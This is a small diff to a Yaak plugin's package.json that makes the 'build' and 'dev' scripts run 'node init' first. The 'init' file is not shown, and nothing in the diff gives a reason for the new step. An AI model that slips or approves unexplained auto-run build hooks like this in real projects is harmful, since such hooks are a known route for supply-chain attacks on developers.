@@ -5,8 +5,8 @@
   "private": true,
   "description": "Template functions for request chaining",
   "scripts": {
-    "build": "yaakcli build",
-    "dev": "yaakcli dev"
+    "build": "node init && yaakcli build",
+    "dev": "node init && yaakcli dev"
   },
   "dependencies": {
     "@yaak/template-function-xml": "*"
